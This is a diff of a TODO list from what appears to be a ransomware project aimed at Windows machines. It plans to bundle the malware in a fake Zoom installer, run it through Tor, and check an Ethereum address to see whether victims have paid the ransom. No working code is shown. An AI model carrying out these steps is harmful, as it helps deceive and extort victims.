@@ -5,8 +5,8 @@ máquinas Windows com CPUs Intel, tanto em ambientes 32 como 64 bits.
 
 # TODO
 
+* Read tor config from stdin
 * Bundle crypto service in fake zoom installer exec.
-* Code to run tor executable.
 * Check if victim has paid the ransom
     + https://ethplorer.io/address/0x2c84c8b62355c56c65f7ced493585311d23c649b
     + https://github.com/EverexIO/Ethplorer/wiki/Ethplorer-API#get-last-block
